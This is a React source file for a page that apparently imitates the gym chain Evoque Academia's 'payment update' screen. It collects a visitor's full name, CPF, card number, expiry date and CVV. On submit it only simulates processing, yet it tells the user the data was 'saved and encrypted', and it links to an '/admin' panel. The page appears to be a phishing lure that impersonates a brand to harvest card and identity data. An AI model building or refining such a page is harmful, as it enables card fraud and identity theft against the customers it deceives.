import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Lock, CreditCard } from 'lucide-react';
import { toast } from 'sonner';
import evoqueLogo from '@/assets/evoque-logo.webp';

const Index = () => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    nomeCompleto: '',
    cpf: '',
    numeroCartao: '',
    validade: '',
    cvv: '',
  });
  const [isSubmitting, setIsSubmitting] = useState(false);

  const formatCPF = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    return numbers
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d{1,2})/, '$1-$2')
      .replace(/(-\d{2})\d+?$/, '$1');
  };

  const formatCardNumber = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    return numbers.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
  };

  const formatValidade = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    if (numbers.length >= 2) {
      return numbers.slice(0, 2) + '/' + numbers.slice(2, 4);
    }
    return numbers;
  };

  const handleInputChange = (field: string, value: string) => {
    let formattedValue = value;
    
    if (field === 'cpf') {
      formattedValue = formatCPF(value);
    } else if (field === 'numeroCartao') {
      formattedValue = formatCardNumber(value);
    } else if (field === 'validade') {
      formattedValue = formatValidade(value);
    } else if (field === 'cvv') {
      formattedValue = value.replace(/\D/g, '').slice(0, 3);
    }

    setFormData(prev => ({ ...prev, [field]: formattedValue }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    // Simula processamento
    await new Promise(resolve => setTimeout(resolve, 1500));

    toast.success('Pagamento atualizado com sucesso!', {
      description: 'Seus dados foram salvos e criptografados.',
    });

    setIsSubmitting(false);
    setFormData({
      nomeCompleto: '',
      cpf: '',
      numeroCartao: '',
      validade: '',
      cvv: '',
    });
  };

  return (
    <div className="min-h-screen bg-background flex flex-col items-center justify-center p-4">
      {/* Background gradient effect */}
      <div className="fixed inset-0 bg-gradient-to-br from-background via-background to-secondary/20 pointer-events-none" />
      
      <div className="relative z-10 w-full max-w-md animate-fade-in">
        {/* Logo */}
        <div className="flex justify-center mb-8">
          <img 
            src={evoqueLogo} 
            alt="Evoque Academia" 
            className="h-16 w-auto object-contain"
          />
        </div>

        {/* Title */}
        <div className="text-center mb-8">
          <h1 className="text-2xl font-bold text-foreground mb-2">
            Atualização de pagamento
          </h1>
          <p className="text-primary font-medium">Evoque Academia</p>
        </div>

        {/* Form Card */}
        <Card className="border-border/50">
          <CardContent className="p-6 space-y-5">
            <form onSubmit={handleSubmit} className="space-y-5">
              <div className="space-y-2">
                <label className="text-sm font-medium text-foreground">
                  Nome completo
                </label>
                <Input
                  placeholder="João da Silva"
                  value={formData.nomeCompleto}
                  onChange={(e) => handleInputChange('nomeCompleto', e.target.value)}
                  required
                />
              </div>

              <div className="space-y-2">
                <label className="text-sm font-medium text-foreground">
                  CPF
                </label>
                <Input
                  placeholder="000.000.000-00"
                  value={formData.cpf}
                  onChange={(e) => handleInputChange('cpf', e.target.value)}
                  maxLength={14}
                  required
                />
              </div>

              <div className="space-y-2">
                <label className="text-sm font-medium text-foreground">
                  Número do cartão
                </label>
                <div className="relative">
                  <Input
                    placeholder="0000 0000 0000 0000"
                    value={formData.numeroCartao}
                    onChange={(e) => handleInputChange('numeroCartao', e.target.value)}
                    maxLength={19}
                    required
                  />
                  <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 h-5 w-5 text-muted-foreground" />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <label className="text-sm font-medium text-foreground">
                    Validade
                  </label>
                  <Input
                    placeholder="MM/YY"
                    value={formData.validade}
                    onChange={(e) => handleInputChange('validade', e.target.value)}
                    maxLength={5}
                    required
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-sm font-medium text-foreground">
                    CVV
                  </label>
                  <Input
                    placeholder="000"
                    type="password"
                    value={formData.cvv}
                    onChange={(e) => handleInputChange('cvv', e.target.value)}
                    maxLength={3}
                    required
                  />
                </div>
              </div>

              <Button 
                type="submit" 
                variant="gradient" 
                size="lg" 
                className="w-full mt-6"
                disabled={isSubmitting}
              >
                {isSubmitting ? 'Processando...' : 'Atualizar pagamento'}
              </Button>
            </form>
          </CardContent>
        </Card>

        {/* Security notice */}
        <div className="flex items-center justify-center gap-2 mt-6 text-muted-foreground text-sm">
          <Lock className="h-4 w-4" />
          <span>Seus dados estão protegidos e criptografados.</span>
        </div>

        {/* Admin link */}
        <div className="text-center mt-8">
          <Button 
            variant="ghost" 
            className="text-muted-foreground hover:text-primary"
            onClick={() => navigate('/admin')}
          >
            Acessar painel administrativo
          </Button>
        </div>
      </div>
    </div>
  );
};

export default Index;
